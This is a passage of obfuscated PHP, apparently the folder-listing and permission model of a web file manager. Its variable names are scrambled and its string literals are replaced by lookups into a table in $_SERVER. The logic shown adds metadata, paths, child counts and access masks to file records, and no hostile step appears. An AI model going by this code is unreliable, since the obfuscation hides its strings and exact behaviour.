Model($¼ì¦¦ÁÙ[490])->get($¼ì¦¦ÁÙ[491]); $ŒÑ¥… = Model($¼ì¦¦ÁÙ[490])->get($¼ì¦¦ÁÙ[492]); $½œê€áñ = array($¼ì¦¦ÁÙ[493] => $¼ì¦¦ÁÙ[494], $¼ì¦¦ÁÙ[495] => $¼ì¦¦ÁÙ[496]); $“¬Àú·¯ = array($¼ì¦¦ÁÙ[32] => $¼ì¦¦ÁÙ[32], $¼ì¦¦ÁÙ[78] => $¼ì¦¦ÁÙ[78], $¼ì¦¦ÁÙ[177] => $¼ì¦¦ÁÙ[456], $¼ì¦¦ÁÙ[497] => $¼ì¦¦ÁÙ[497], $¼ì¦¦ÁÙ[498] => $¼ì¦¦ÁÙ[499], $¼ì¦¦ÁÙ[217] => $¼ì¦¦ÁÙ[217], $¼ì¦¦ÁÙ[87] => $¼ì¦¦ÁÙ[87]); $¿î ¡¹ = Input::get($¼ì¦¦ÁÙ[500], $¼ì¦¦ÁÙ[7], $¶ˆ£ÕŠ², array_keys($“¬Àú·¯)); $Ğû·¹×ğ = Input::get($¼ì¦¦ÁÙ[501], $¼ì¦¦ÁÙ[7], $ŒÑ¥…, array_keys($½œê€áñ)); if (!in_array($¿î ¡¹, array_keys($“¬Àú·¯))) { $¿î ¡¹ = $¼ì¦¦ÁÙ[32]; } if (!in_array($Ğû·¹×ğ, array_keys($½œê€áñ))) { $¿î ¡¹ = $¼ì¦¦ÁÙ[493]; } if ($¿î ¡¹ == $¼ì¦¦ÁÙ[32]) { } $åÀ¼¼Àİ = $¼ì¦¦ÁÙ[502] . $“¬Àú·¯[$¿î ¡¹] . $¼ì¦¦ÁÙ[53] . $½œê€áñ[$Ğû·¹×ğ]; $åÀ¼¼Àİ = rtrim(trim($åÀ¼¼Àİ), $¼ì¦¦ÁÙ[50]); if ($åÍßà§º) { return array($åÀ¼¼Àİ, $½œê€áñ[$Ğû·¹×ğ]); } return $this->order($åÀ¼¼Àİ); } protected function _listDataApplyItem($á”•Ãê€, $İèÉÒÜ‘ = false) { $ééÍ¡¾Ğ = array($á”•Ãê€); $this->_listDataApply($ééÍ¡¾Ğ, $İèÉÒÜ‘); return $ééÍ¡¾Ğ[0]; } protected function _listDataApply(&$´±ñŒ‡º, $»áÁœØ = false) { $ ÓØ¼²á =& $_SERVER[èùÙ¹Ïö]; if (!$´±ñŒ‡º) { $´±ñŒ‡º = array(); return; } $Ø§¥„Å® = array_to_keyvalue($´±ñŒ‡º, $ ÓØ¼²á[12], $ ÓØ¼²á[183]); $Ø§¥„Å® = array_unique($Ø§¥„Å®); $this->_listSourceCache($´±ñŒ‡º); if (!$»áÁœØ) { $this->_listAppendMeta($´±ñŒ‡º, $Ø§¥„Å®); $this->_listAppendFileMeta($´±ñŒ‡º, $Ø§¥„Å®); $this->_listAppendChildren($´±ñŒ‡º, $Ø§¥„Å®); } $this->_listAppendPath($´±ñŒ‡º); $this->_listAppendAuth($´±ñŒ‡º); $this->_listAppendSourceInfo($´±ñŒ‡º, $Ø§¥„Å®); $this->_listAppendUser($´±ñŒ‡º); $this->_listFilterInfo($´±ñŒ‡º, $»áÁœØ); $this->_listAppendAuthSecret($´±ñŒ‡º); } protected function _listSourceCache($Óö‘öœï) { $’ƒûÌ‘ =& $_SERVER[èùÙ¹Ïö]; foreach ($Óö‘öœï as $¿ÄÅÃ¸) { self::$cacheSourceInfo[$’ƒûÌ‘[503] . $¿ÄÅÃ¸[$’ƒûÌ‘[183]]] = $¿ÄÅÃ¸; } } protected function _listFilterInfo(&$èçÓË™, $Àì×»‰ = false) { $ñÜÙ =& $_SERVER[èùÙ¹Ïö]; foreach ($èçÓË™ as &$Ÿ—°•Á›) { $Ÿ—°•Á› = $this->pathInfoFilter($Ÿ—°•Á›); self::$cachePathInfo[$ñÜÙ[504] . intval($Àì×»‰) . $ñÜÙ[432] . $Ÿ—°•Á›[$ñÜÙ[183]]] = $Ÿ—°•Á›; } unset($Ÿ—°•Á›); } protected function _listMake(&$É“ÏüÚ°) { $Ùï§¾ëç =& $_SERVER[èùÙ¹Ïö]; $É“ÏüÚ°[$Ùï§¾ëç[84]] = array(); $É“ÏüÚ°[$Ùï§¾ëç[85]] = array(); foreach ($É“ÏüÚ°[$Ùï§¾ëç[415]] as $µ–üÓìÅ) { $‚ËÔ¿¢õ = $µ–üÓìÅ[$Ùï§¾ëç[455]] == 1 ? $Ùï§¾ëç[84] : $Ùï§¾ëç[85]; $É“ÏüÚ°[$‚ËÔ¿¢õ][] = $µ–üÓìÅ; } unset($É“ÏüÚ°[$Ùï§¾ëç[415]]); } protected function _listAppendMeta(&$—àÇÌÖ«, $Ÿë„Òµ¨) { $ğÊó¹å¥ =& $_SERVER[èùÙ¹Ïö]; $×àÉ™ó¼ = array($ğÊó¹å¥[461] => array($ğÊó¹å¥[462], $Ÿë„Òµ¨)); $ÚÑ—ø² = Model($ğÊó¹å¥[505])->field($ğÊó¹å¥[506])->where($×àÉ™ó¼)->select(); if (!$ÚÑ—ø²) { return; } $Ùšåºá = array($ğÊó¹å¥[507], $ğÊó¹å¥[508], $ğÊó¹å¥[487]); $½éÂ«™ = array(); foreach ($ÚÑ—ø² as $£šˆ¾ß») { if (!isset($½éÂ«™[$£šˆ¾ß»[$ğÊó¹å¥[183]]])) { $½éÂ«™[$£šˆ¾ß»[$ğÊó¹å¥[183]]] = array(); } if (in_array($£šˆ¾ß»[$ğÊó¹å¥[96]], $Ùšåºá)) { continue; } $½éÂ«™[$£šˆ¾ß»[$ğÊó¹å¥[183]]][$£šˆ¾ß»[$ğÊó¹å¥[96]]] = $£šˆ¾ß»[$ğÊó¹å¥[420]]; } foreach ($—àÇÌÖ« as &$¯ï¢„Ûü) { $¯ï¢„Ûü[$ğÊó¹å¥[509]] = !1; if (isset($½éÂ«™[$¯ï¢„Ûü[$ğÊó¹å¥[183]]])) { $¯ï¢„Ûü[$ğÊó¹å¥[509]] = $½éÂ«™[$¯ï¢„Ûü[$ğÊó¹å¥[183]]]; } if ($this->fileIsLock($¯ï¢„Ûü) && $¯ï¢„Ûü[$ğÊó¹å¥[457]]) { $Õëä’–¿ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¯ï¢„Ûü[$ğÊó¹å¥[457]][$ğÊó¹å¥[458]] = AuthModel::authDisable($¯ï¢„Ûü[$ğÊó¹å¥[457]][$ğÊó¹å¥[458]], $Õëä’–¿); $¯ï¢„Ûü[$ğÊó¹å¥[457]][$ğÊó¹å¥[510]][$ğÊó¹å¥[457]] = $¯ï¢„Ûü[$ğÊó¹å¥[457]][$ğÊó¹å¥[458]]; } } unset($¯ï¢„Ûü); } protected function _listAppendFileMeta(&$–ôµÂ, $—Ú€ÏŒ) { $õÉÆµ‘ =& $_SERVER[èùÙ¹Ïö]; $ôıÑÄØµ = array_to_keyvalue($–ôµÂ, $õÉÆµ‘[12], $õÉÆµ‘[511]); $ôıÑÄØµ = array_filter(array_unique($ôıÑÄØµ)); if (!$ôıÑÄØµ) { return; } $„ıŸø = array($õÉÆµ‘[512] => array($õÉÆµ‘[462], $ôıÑÄØµ)); $²˜±šá† = $õÉÆµ‘[513]; $óßıàêÁ = Model($õÉÆµ‘[514])->field($²˜±šá†)->where($„ıŸø)->select(); $óßıàêÁ = array_to_keyvalue($óßıàêÁ, $õÉÆµ‘[511]); $’ìÅéÜÖ = Model($õÉÆµ‘[515])->field($õÉÆµ‘[516])->where($„ıŸø)->select(); $’ìÅéÜÖ = $’ìÅéÜÖ ? $’ìÅéÜÖ : array(); $Ğó©“ÌÕ = array(); foreach ($’ìÅéÜÖ as $ÙŒÏÀÕ¡) { if (!isset($Ğó©“ÌÕ[$ÙŒÏÀÕ¡[$õÉÆµ‘[511]]])) { $Ğó©“ÌÕ[$ÙŒÏÀÕ¡[$õÉÆµ‘[511]]] = array(); } $Ğó©“ÌÕ[$ÙŒÏÀÕ¡[$õÉÆµ‘[511]]][$ÙŒÏÀÕ¡[$õÉÆµ‘[96]]] = $ÙŒÏÀÕ¡[$õÉÆµ‘[420]]; } foreach ($–ôµÂ as &$ÆÆßËôŸ) { $¾Ø™¯ú = $ÆÆßËôŸ[$õÉÆµ‘[511]]; if (!$¾Ø™¯ú || !is_array($óßıàêÁ[$¾Ø™¯ú])) { continue; } $¶ğÆ„×µ = $óßıàêÁ[$¾Ø™¯ú]; $¶ğÆ„×µ[$õÉÆµ‘[78]] = $ÆÆßËôŸ[$õÉÆµ‘[78]]; $¶ğÆ„×µ[$õÉÆµ‘[32]] = $ÆÆßËôŸ[$õÉÆµ‘[32]]; if (!$¶ğÆ„×µ[$õÉÆµ‘[517]]) { Model($õÉÆµ‘[514])->fileMd5Check($¶ğÆ„×µ); } if (!isset(self::$cacheFileInfo[$õÉÆµ‘[518] . $¾Ø™¯ú])) { self::$cacheFileInfo[$õÉÆµ‘[518] . $¾Ø™¯ú] = array_merge(array(), $¶ğÆ„×µ); } unset($óßıàêÁ[$¾Ø™¯ú][$õÉÆµ‘[86]]); $¿êÖº½‰ = is_array($Ğó©“ÌÕ[$¾Ø™¯ú]) ? $Ğó©“ÌÕ[$¾Ø™¯ú] : array(); $ÆÆßËôŸ[$õÉÆµ‘[519]] = array_merge($¿êÖº½‰, $óßıàêÁ[$¾Ø™¯ú]); if (isset($ÆÆßËôŸ[$õÉÆµ‘[519]][$õÉÆµ‘[173]])) { $ÆÆßËôŸ[$õÉÆµ‘[173]] = json_decode($ÆÆßËôŸ[$õÉÆµ‘[519]][$õÉÆµ‘[173]], !0); unset($ÆÆßËôŸ[$õÉÆµ‘[519]][$õÉÆµ‘[173]]); } } unset($ÆÆßËôŸ); } protected function _listAppendSourceInfo(&$†ÈÏš†‚, $ª ®í) { $ü¾å™Î =& $_SERVER[èùÙ¹Ïö]; $û¤¯ëµ« = Model($ü¾å™Î[520])->listData(); $—úÑÚ–Á = Model($ü¾å™Î[469])->listData(); $Í¿øæ  = Model($ü¾å™Î[459])->listData(); $·ÄÍÀÍÛ = Model($ü¾å™Î[521])->listSimple(); $‚Ò¤„Ô“ = array_to_keyvalue($û¤¯ëµ«, $ü¾å™Î[445]); $„ºØøÊ = array_to_keyvalue_group($—úÑÚ–Á, $ü¾å™Î[86], $ü¾å™Î[470]); $…»èé‹Ò = array_to_keyvalue($Í¿øæ , $ü¾å™Î[86]); $£şéÁğÅ = array_to_keyvalue_group($·ÄÍÀÍÛ, $ü¾å™Î[183]); foreach ($†ÈÏš†‚ as &$ôîá…×Î) { $ôîá…×Î[$ü¾å™Î[89]] = array($ü¾å™Î[522] => 0, $ü¾å™Î[523] => 0, $ü¾å™Î[524] => 0); if (isset($…»èé‹Ò[$ôîá…×Î[$ü¾å™Î[183]]])) { $ôîá…×Î[$ü¾å™Î[89]][$ü¾å™Î[525]] = 1; $ôîá…×Î[$ü¾å™Î[89]][$ü¾å™Î[526]] = $…»èé‹Ò[$ôîá…×Î[$ü¾å™Î[183]]][$ü¾å™Î[32]]; } if ($„ºØøÊ && $‚Ò¤„Ô“ && isset($„ºØøÊ[$ôîá…×Î[$ü¾å™Î[183]]])) { $ôîá…×Î[$ü¾å™Î[89]][$ü¾å™Î[527]] = array(); foreach ($„ºØøÊ[$ôîá…×Î[$ü¾å™Î[183]]] as $Î¿Ğáì–) { $Ùê—¡Ô¨ = $‚Ò¤„Ô“[$Î¿Ğáì–]; $ôîá…×Î[$ü¾å™Î[89]][$ü¾å™Î[527]][] = array($ü¾å™Î[528] => $Ùê—¡Ô¨[$ü¾å™Î[445]], $ü¾å™Î[464] => $Ùê—¡Ô¨[$ü¾å™Î[32]], $ü¾å™Î[529] => $Ùê—¡Ô¨[$ü¾å™Î[530]]); } } if ($£şéÁğÅ && isset($£şéÁğÅ[$ôîá…×Î[$ü¾å™Î[183]]])) { $ôîá…×Î[$ü¾å™Î[89]][$ü¾å™Î[531]] = array(); foreach ($£şéÁğÅ[$ôîá…×Î[$ü¾å™Î[183]]] as $¨İÛìıÃ) { $ÕÔ›ÑÕÓ = $ü¾å™Î[532]; if ($¨İÛìıÃ[$ü¾å™Î[533]] == $ü¾å™Î[90]) { $ÕÔ›ÑÕÓ .= $ü¾å™Î[534]; } $ôîá…×Î[$ü¾å™Î[89]][$ü¾å™Î[531]] = array_field_key($¨İÛìıÃ, explode($ü¾å™Î[50], $ÕÔ›ÑÕÓ)); } } } unset($ôîá…×Î); return $†ÈÏš†‚; } protected function _listAppendChildren(&$àÇÈ—ê», $şŠ¼Ïäö) { $×ü÷±ØË =& $_SERVER[èùÙ¹Ïö]; $Ş•ßîµÇ = array(); $èÉ €œŸ = array($×ü÷±ØË[225] => 0, $×ü÷±ØË[226] => 0); foreach ($àÇÈ—ê» as &$ÊÚÕ…¸) { if (!$ÊÚÕ…¸[$×ü÷±ØË[455]]) { continue; } $Ş•ßîµÇ[] = $ÊÚÕ…¸[$×ü÷±ØË[183]]; } unset($ÊÚÕ…¸); if (!$Ş•ßîµÇ) { return; } $Ü§º®¹Ğ = array($×ü÷±ØË[182] => array($×ü÷±ØË[7], $Ş•ßîµÇ), $×ü÷±ØË[475] => 0); $’ŸÃÁœç = array($×ü÷±ØË[182], $×ü÷±ØË[455], $×ü÷±ØË[535] => $×ü÷±ØË[536]); $úø†·  = $this->field($’ŸÃÁœç)->where($Ü§º®¹Ğ)->group($×ü÷±ØË[537])->select(); $öÇê×­ë = array(); foreach ($úø†·  as $¶ù×ü°Ù) { $ÕĞ´¡Æç = $¶ù×ü°Ù[$×ü÷±ØË[182]]; $‘Ïµœ…î = $¶ù×ü°Ù[$×ü÷±ØË[455]] == $×ü÷±ØË[90] ? $×ü÷±ØË[226] : $×ü÷±ØË[225]; if (!isset($öÇê×­ë[$ÕĞ´¡Æç])) { $öÇê×­ë[$ÕĞ´¡Æç] = array($×ü÷±ØË[225] => 0, $×ü÷±ØË[226] => 0); } $öÇê×­ë[$ÕĞ´¡Æç][$‘Ïµœ…î] += $¶ù×ü°Ù[$×ü÷±ØË[536]]; } foreach ($àÇÈ—ê» as &$ÊÚÕ…¸) { if (!$ÊÚÕ…¸[$×ü÷±ØË[455]]) { continue; } $˜¹£®ÚÒ = is_array($öÇê×­ë[$ÊÚÕ…¸[$×ü÷±ØË[183]]]) ? $öÇê×­ë[$ÊÚÕ…¸[$×ü÷±ØË[183]]] : $èÉ €œŸ; $ÊÚÕ…¸[$×ü÷±ØË[226]] = $˜¹£®ÚÒ[$×ü÷±ØË[226]]; $ÊÚÕ…¸[$×ü÷±ØË[225]] = $˜¹£®ÚÒ[$×ü÷±ØË[225]]; unset($ÊÚÕ…¸[$×ü÷±ØË[456]]); } unset($ÊÚÕ…¸); } protected function _listAppendAuth(&$¢éäµ‘) { $ûÃŠİã =& $_SERVER[èùÙ¹Ïö]; $¥×Ø´Ä = array(); foreach ($¢éäµ‘ as $ÄÈ…·º¾) { if ($ÄÈ…·º¾[$ûÃŠİã[180]] == self::TYPE_GROUP) { $¥×Ø´Ä[] = $ÄÈ…·º¾[$ûÃŠİã[183]]; } } if (!$¥×Ø´Ä) { return; } $åêì†¯Õ = array_to_keyvalue($¢éäµ‘, $ûÃŠİã[183]); $Öö²± = Model($ûÃŠİã[538])->getSourceList($¥×Ø´Ä, $åêì†¯Õ); $»Ñ…–ª = $GLOBALS[$ûÃŠİã[539]] == 1; foreach ($¢éäµ‘ as $¶Ö ¾¤â => &$ÄÈ…·º¾) { $ÄÈ…·º¾[$ûÃŠİã[457]] = $Öö²±[$ÄÈ…·º¾[$ûÃŠİã[183]]]; if (!$ÄÈ…·º¾[$ûÃŠİã[457]] && $ÄÈ…·º¾[$ûÃŠİã[180]] == self::TYPE_GROUP) { $ÄÈ…·º¾[$ûÃŠİã[457]] = Action($ûÃŠİã[540])->pathGroupAuthMake($ÄÈ…·º¾[$ûÃŠİã[541]]); if (!$ÄÈ…·º¾[$ûÃŠİã[457]] && !$»Ñ…–ª) { $ÄÈ…·º¾[$ûÃŠİã[219]] = !1; $ÄÈ…·º¾[$ûÃŠİã[218]] = !1; } } if ($ÄÈ…·º¾[$ûÃŠİã[457]]) { $ÄÈ…·º¾[$ûÃŠİã[219]] = AuthModel::authCheckEdit($ÄÈ…·º¾[$ûÃŠİã[457]][$ûÃŠİã[458]]); $ÄÈ…·º¾[$ûÃŠİã[218]] = AuthModel::authCheckView($ÄÈ…·º¾[$ûÃŠİã[457]][$ûÃŠİã[458]]); } $this->groupPathDisplay($ÄÈ…·º¾); } unset($ÄÈ…·º¾); } public function _listAppendAuthSecret(&$´¶î¬‹™) { $òáÆêâ =& $_SERVER[èùÙ¹Ïö]; if (Model($òáÆêâ[478])->get($òáÆêâ[542]) != $òáÆêâ[90]) { return; } static $ÔÆê¾Ö = false; if (!$ÔÆê¾Ö) { $áÄ¨â„ä = Model($òáÆêâ[543]); $Ò²øıÉÜ = Model($òáÆêâ[544]); $ÔÆê¾Ö = $Ò²øıÉÜ->listData(); $ÔÆê¾Ö = array_to_keyvalue($ÔÆê¾Ö, $òáÆêâ[183]); $•ğÕ—°“ = json_decode(Model($òáÆêâ[478])->get($òáÆêâ[545]), !0); $•ğÕ—°“ = array_to_keyvalue($•ğÕ—°“, $òáÆêâ[445]); foreach ($ÔÆê¾Ö as $Œ±“ÚùÄ => $‡ŞÂÏé) { $õË£‘çÌ = $•ğÕ—°“[$‡ŞÂÏé[$òáÆêâ[546]]]; if (!$õË£‘çÌ) { $Ò²øıÉÜ->remove($‡ŞÂÏé[$òáÆêâ[445]]); unset($ÔÆê¾Ö[$Œ±“ÚùÄ]); continue; } $æ²šĞ¾Õ = $áÄ¨â„ä->listData($õË£‘çÌ[$òáÆêâ[457]]); if (!$æ²šĞ¾Õ) { $Ò²øıÉÜ->remove($‡ŞÂÏé[$òáÆêâ[445]]); unset($ÔÆê¾Ö[$Œ±“ÚùÄ]); continue; } $‡ŞÂÏé[$òáÆêâ[457]] = $æ²šĞ¾Õ; $‡ŞÂÏé[$òáÆêâ[547]] = $õË£‘çÌ; $‡ŞÂÏé[$òáÆêâ[548]] = Model($òáÆêâ[549])->getInfoSimpleOuter($‡ŞÂÏé[$òáÆêâ[497]]); $ÔÆê¾Ö[$Œ±“ÚùÄ] = $‡ŞÂÏé; } } $šÑ‹ä­İ = USER_ID; $ˆ°­šˆû = array(); $‘€¶Î´Å = $this->_listAppendPath($ˆ°­šˆû, !0); foreach ($´¶î¬‹™ as $Œ±“ÚùÄ => &$‡ŞÂÏé) { if (!is_array($‡ŞÂÏé[$òáÆêâ[457]])) { continue; } if ($‡ŞÂÏé[$òáÆêâ[180]] != $òáÆêâ[550]) { continue; } if (isset($ÔÆê¾Ö[$‡ŞÂÏé[$òáÆêâ[183]]])) { $„“âÏÈ = $ÔÆê¾Ö[$‡ŞÂÏé[$òáÆêâ[183]]]; if (!is_array($‡ŞÂÏé[$òáÆêâ[509]])) { $‡ŞÂÏé[$òáÆêâ[509]] = array(); } $‡ŞÂÏé[$òáÆêâ[509]][$òáÆêâ[551]] = $„“âÏÈ[$òáÆêâ[546]]; $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[552]] = $„“âÏÈ; $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[553]] = $‡ŞÂÏé[$òáÆêâ[554]]; $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[555]] = $òáÆêâ[90]; if ($„“âÏÈ[$òáÆêâ[497]] != $šÑ‹ä­İ) { $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[458]] = $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[458]] & $„“âÏÈ[$òáÆêâ[457]][$òáÆêâ[457]]; } continue; } $åƒå¦Ç¥ = $this->parentLevelArray($‡ŞÂÏé[$òáÆêâ[556]]); $ÂŒŠ’ÃĞ = array_reverse($åƒå¦Ç¥); foreach ($ÂŒŠ’ÃĞ as $¿‘©öœê => $§ış‡±ô) { if (!isset($ÔÆê¾Ö[$§ış‡±ô])) { continue; } $„“âÏÈ = $ÔÆê¾Ö[$§ış‡±ô]; $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[552]] = $„“âÏÈ; if ($„“âÏÈ[$òáÆêâ[497]] != $šÑ‹ä­İ) { $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[458]] = $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[458]] & $„“âÏÈ[$òáÆêâ[457]][$òáÆêâ[457]]; } $‘¬Ø«™ì = $òáÆêâ[12]; $ƒ¥¾Ğñ = count($åƒå¦Ç¥) - $¿‘©öœê; for ($«Ä‚õá = 0; $«Ä‚õá < $ƒ¥¾Ğñ; $«Ä‚õá++) { if (!isset($‘€¶Î´Å[$åƒå¦Ç¥[$«Ä‚õá]])) { $‘¬Ø«™ì = $òáÆêâ[12]; break; } $‘¬Ø«™ì = $‘¬Ø«™ì . rtrim($‘€¶Î´Å[$åƒå¦Ç¥[$«Ä‚õá]], $òáÆêâ[8]) . $òáÆêâ[8]; } $‡ŞÂÏé[$òáÆêâ[457]][$òáÆêâ[553]] = rtrim($‘¬Ø«™ì, $òáÆêâ[8]) . $òáÆêâ[8]; break; } } unset($‡ŞÂÏé); } public function groupPathDisplay(&$ÔáÈ¾µ) { $¸œµ“•é =& $_SERVER[èùÙ¹Ïö]; if ($ÔáÈ¾µ[$¸œµ“•é[180]] != self::TYPE_GROUP) { return; } $…ÍÑŒæ = Model($¸œµ“•é[557])->getInfo($ÔáÈ¾µ[$¸œµ“•é[541]]); $—‘²ê‡ï = $this->parentLevelArray($…ÍÑŒæ[$¸œµ“•é[556]]); $„ÙÓà… = $¸œµ“•é[12]; foreach ($—‘²ê‡ï as $óé³ë¦è) { $âŒÀ¶Ü = Model($¸œµ“•é[557])->getInfo($óé³ë¦è); $„ÙÓà… .= $âŒÀ¶Ü[$¸œµ“•é[89]][$¸œµ“•é[183]] . $¸œµ“•é[50]; } $ÔáÈ¾µ[$¸œµ“•é[558]] = $…ÍÑŒæ[$¸œµ“•é[182]]; $ÔáÈ¾µ[$¸œµ“•é[559]] = $…ÍÑŒæ[$¸œµ“•é[556]]; $ÔáÈ¾µ[$¸œµ“•é[560]] = $…ÍÑŒæ[$¸œµ“•é[561]]; $ÔáÈ¾µ[$¸œµ“•é[562]] = $„ÙÓà… . $…ÍÑŒæ[$¸œµ“•é[89]][$¸œµ“•é[183]]; } protected function _listAppendPath(&$¡³ÌºŸ, $ùÕÙ„â = false) { $ß¬ãÀæë =& $_SERVER[èùÙ¹Ïö]; static $¦˜—î˜ı = array(); $å¸ğ­œ = array(); $ùÀ”áåÀ = array(); if ($ùÕÙ„â) { return $¦˜—î˜ı; } foreach ($¡³ÌºŸ as &$¼Éª—Ğ) { $ÊıÌ¹Â¯ = $¼Éª—Ğ[$ß¬ãÀæë[183]]; if ($¼Éª—Ğ[$ß¬ãÀæë[455]] == $ß¬ãÀæë[90] && $¼Éª—Ğ[$ß¬ãÀæë[182]] != 0) { $¦˜—î˜ı[$ÊıÌ¹Â¯] = $¼Éª—Ğ[$ß¬ãÀæë[32]]; } if ($¼Éª—Ğ[$ß¬ãÀæë[455]] == $ß¬ãÀæë[90] && $¼Éª—Ğ[$ß¬ãÀæë[182]] == 0) { $¦˜—î˜ı[$ÊıÌ¹Â¯] = $this->_listAppendPathRoot($¼Éª—Ğ, array()); } if (isset($ùÀ”áåÀ[$¼Éª—Ğ[$ß¬ãÀæë[556]]])) { continue; } $ùÀ”áåÀ[$¼Éª—Ğ[$ß¬ãÀæë[556]]] = !0; $È¤¢Ù³Ò = $this->parentLevelArray($¼Éª—Ğ[$ß¬ãÀæë[556]]); foreach ($È¤¢Ù³Ò as $ä¬Â”ª => $„ÇËóÏà) { if (isset($¦˜—î˜ı[$„ÇËóÏà])) { continue; } if ($ä¬Â”ª == 0) { $¦˜—î˜ı[$„ÇËóÏà] = $this->_listAppendPathRoot($¼Éª—Ğ, $È¤¢Ù³Ò); } if ($ä¬Â”ª != 0) { $å¸ğ­œ[] = $„ÇËóÏà; } } } unset($¼Éª—Ğ); $å¸ğ­œ = array_unique($å¸ğ­œ); if (count($å¸ğ­œ) > 0) { $Ùö³ï‚ = array($ß¬ãÀæë[461] => array($ß¬ãÀæë[462], $å¸ğ­œ)); if (count($å¸ğ­œ) == 1) { $¤ƒ›»§¹ = $this->sourceInfo($å¸ğ­œ[0]); $Û”±œ‹ = is_array($¤ƒ›»§¹) ? array($¤ƒ›»§¹) : !1; } else { $Û”±œ‹ = $this->field($ß¬ãÀæë[563])->where($Ùö³ï‚)->select(); } if (!$Û”±œ‹) { $Û”±œ‹ = array(); } foreach ($Û”±œ‹ as $Îó¥ Ò®) { $¦˜—î˜ı[$Îó¥ Ò®[$ß¬ãÀæë[183]]] = $Îó¥ Ò®[$ß¬ãÀæë[32]]; } } $¸Û¸Æñô = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $èŠ¬˜—¼ = array(); foreach ($¡³ÌºŸ as &$¼Éª—Ğ) { $ñ±ÙöÍí = $¼Éª—Ğ[$ß¬ãÀæë[556]]; $ÉçšÃ¬° = $ß¬ãÀæë[12]; if (isset($èŠ¬˜—¼[$ñ±ÙöÍí])) { $ÉçšÃ¬° = $èŠ¬˜—¼[$ñ±ÙöÍí]; } else { $È¤¢Ù³Ò = $this->parentLevelArray($¼Éª—Ğ[$ß¬ãÀæë[556]]); foreach ($È¤¢Ù³Ò as $ä¬Â”ª => $„ÇËóÏà) { if (isset($¦˜—î˜ı[$„ÇËóÏà])) { $ÉçšÃ¬° .= $¦˜—î˜ı[$„ÇËóÏà] . $ß¬ãÀæë[8]; } } $èŠ¬˜—¼[$ñ±ÙöÍí] = $ÉçšÃ¬°; } $ÉçšÃ¬° .= $¼Éª—Ğ[$ß¬ãÀæë[32]]; if ($¼Éª—Ğ[$ß¬ãÀæë[455]] == $ß¬ãÀæë[90]) { $ÉçšÃ¬° .= $ß¬ãÀæë[8]; } $¼Éª—Ğ[$ß¬ãÀæë[554]] = str_replace($ß¬ãÀæë[564], $ß¬ãÀæë[8], $ÉçšÃ¬°); if ($¼Éª—Ğ[$ß¬ãÀæë[182]] == $ß¬ãÀæë[214]) { $¼Éª—Ğ[$ß¬ãÀæë[32]] = trim($¦˜—î˜ı[$¼Éª—Ğ[$ß¬ãÀæë[183]]], $ß¬ãÀæë[8]); $¼Éª—Ğ[$ß¬ãÀæë[554]] = $¼Éª—Ğ[$ß¬ãÀæë[32]] . $ß¬ãÀæë[8]; } if (intval($¼Éª—Ğ[$ß¬ãÀæë[180]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¼Éª—Ğ, $È¤¢Ù³Ò, $¸Û¸Æñô); } } unset($¼Éª—Ğ); return $¡³ÌºŸ; } private function _listAppendPathRecycle(&$‡ŒŸŠş£, $¨®€Ó, $ÙÆÌØÄ) { $Óƒ¢Šà› =& $_SERVER[èùÙ¹Ïö]; if (!in_array($ÙÆÌØÄ, $¨®€Ó) && $‡ŒŸŠş£[$Óƒ¢Šà›[183]] != $ÙÆÌØÄ) { return; } $¢– = explode($Óƒ¢Šà›[8], trim($‡ŒŸŠş£[$Óƒ¢Šà›[554]], $Óƒ¢Šà›[8])); $ÒÈ‚Í„÷ = implode($Óƒ¢Šà›[8], array_slice($¢–, 2)); $‡ŒŸŠş£[$Óƒ¢Šà›[554]] = $Óƒ¢Šà›[8] . LNG($Óƒ¢Šà›[565]) . $Óƒ¢Šà›[8] . ltrim($ÒÈ‚Í„÷, $Óƒ¢Šà›[8]); $‡ŒŸŠş£[$Óƒ¢Šà›[556]] = $Óƒ¢Šà›[566] . implode($Óƒ¢Šà›[50], array_slice($¨®€Ó, 1)) . $Óƒ¢Šà›[50]; if ($‡ŒŸŠş£[$Óƒ¢Šà›[183]] == $ÙÆÌØÄ) { $‡ŒŸŠş£[$Óƒ¢Šà›[556]] = $Óƒ¢Šà›[566]; $‡ŒŸŠş£[$Óƒ¢Šà›[182]] = $Óƒ¢Šà›[214]; $‡ŒŸŠş£[$Óƒ¢Šà›[32]] = LNG($Óƒ¢Šà›[565]); } $‡ŒŸŠş£[$Óƒ¢Šà›[567]] = $Óƒ¢Šà›[568]; } protected function _listAppendPathRoot(&$¹æ°š»£, $Ÿ”ÚÕ‡”) { $ÒÛÍÁá =& $_SERVER[èùÙ¹Ïö]; static $ÊÁ‡†şã = false; $‡à£ÒÀ = $ÒÛÍÁá[12]; if ($¹æ°š»£[$ÒÛÍÁá[180]] == self::TYPE_USER) { if ($¹æ°š»£[$ÒÛÍÁá[541]] == USER_ID) { $‡à£ÒÀ = LNG($ÒÛÍÁá[569]); if ($ÊÁ‡†şã === !1) { $Ğİ·š²ò = Model($ÒÛÍÁá[570])->getInfoFull(USER_ID); $ÊÁ‡†şã = _get($Ğİ·š²ò, $ÒÛÍÁá[571], $ÒÛÍÁá[12]); } if ($Ÿ”ÚÕ‡” && $Ÿ”ÚÕ‡”[0] == $ÊÁ‡†şã || !$Ÿ”ÚÕ‡” && $¹æ°š»£[$ÒÛÍÁá[183]] == $ÊÁ‡†şã) { $‡à£ÒÀ = LNG($ÒÛÍÁá[572]); $¹æ°š»£[$ÒÛÍÁá[573]] = $ÒÛÍÁá[574]; } if (!$Ÿ”ÚÕ‡”) { $¹æ°š»£[$ÒÛÍÁá[32]] = $‡à£ÒÀ; } } else { $¹æ°š»£[$ÒÛÍÁá[575]] = Model($ÒÛÍÁá[549])->getInfoSimpleOuter($¹æ°š»£[$ÒÛÍÁá[541]]); $‡à£ÒÀ = LNG($ÒÛÍÁá[576]) . $ÒÛÍÁá[165] . $¹æ°š»£[$ÒÛÍÁá[575]][$ÒÛÍÁá[32]] . $ÒÛÍÁá[167]; } } else { if 